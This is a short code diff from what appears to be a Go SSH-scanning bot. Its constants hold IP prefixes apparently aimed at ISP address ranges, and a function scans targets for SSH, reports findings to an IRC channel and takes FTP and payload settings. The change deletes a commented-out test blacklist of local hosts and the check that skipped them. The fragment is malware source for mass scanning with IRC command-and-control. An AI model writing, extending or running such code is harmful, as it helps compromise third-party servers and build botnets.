@@ -48,14 +48,6 @@ const (
 	cgpn4 = "14."  //14.112.0.0 - 14.127.255.255
 	cgpn5 = "183." //183.0.0.0 - 183.63.255.255
 	cgpn6 = "124." //124.172.0.0 - 124.175.255.255
-
-	/* For test.
-	priv = "192."
-
-	//Blacklist ip
-	bl1 = "192.168.1.1:22"
-	bl2 = "192.168.1.16:22"
-	*/
 )
 
 func GenRange(max, min int) string {
@@ -169,12 +161,6 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			target := NextIP(NetArr[i])
 			ptrTarget := &target
 			turnRange := CheckPort(*ptrTarget)
-
-			/*
-				if target == bl1 || target == bl2 {
-					break
-				}
-			*/
 
 			if turnRange == "" {
 				IRC_Report(reportIRC, set_chan, target+" SSH not found.")
